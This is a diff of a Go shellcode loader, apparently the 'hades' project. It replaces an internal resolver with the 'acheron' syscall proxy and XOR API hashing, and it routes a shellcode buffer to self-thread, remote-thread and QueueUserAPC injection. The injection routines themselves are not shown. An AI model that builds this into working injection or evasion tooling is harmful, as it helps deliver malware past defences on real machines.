@@ -3,39 +3,37 @@ package loader
 import (
 	"fmt"
 
-	"github.com/f1zm0/hades/internal/resolver"
+	"github.com/f1zm0/acheron"
+	"github.com/f1zm0/acheron/pkg/hashing"
+	hsh "github.com/f1zm0/hades/pkg/hashing"
 )
 
-type Loader interface {
-	Load(scBuf []byte, technique string) error
+type Loader struct {
+	callProxy *acheron.Acheron
+	hashFunc  hashing.HashFunction // func([]byte) uint64
 }
 
-type loader struct {
-	resolver resolver.Resolver
-}
-
-var _ Loader = (*loader)(nil)
-
-func NewLoader() (Loader, error) {
-	r, err := resolver.NewResolver()
-	if err != nil {
+func NewLoader() (*Loader, error) {
+	if r, err := acheron.New(
+		acheron.WithHashFunction(hsh.XORHash),
+	); err != nil {
 		return nil, err
+	} else {
+		return &Loader{
+			callProxy: r,
+			hashFunc:  hsh.XORHash,
+		}, nil
 	}
-	pl := &loader{
-		resolver: r,
-	}
-
-	return pl, nil
 }
 
-func (ldr *loader) Load(scBuf []byte, technique string) error {
+func (l *Loader) Load(scBuf []byte, technique string) error {
 	switch technique {
 	case "selfthread":
-		return ldr.selfInjectThread(scBuf)
+		return l.selfInjectThread(scBuf)
 	case "remotethread":
-		return ldr.remoteThreadInject(scBuf)
+		return l.remoteThreadInject(scBuf)
 	case "queueuserapc":
-		return ldr.queueUserAPC(scBuf)
+		return l.queueUserAPC(scBuf)
 	default:
 		fmt.Printf("[!] Invalid technique %s", technique)
 	}
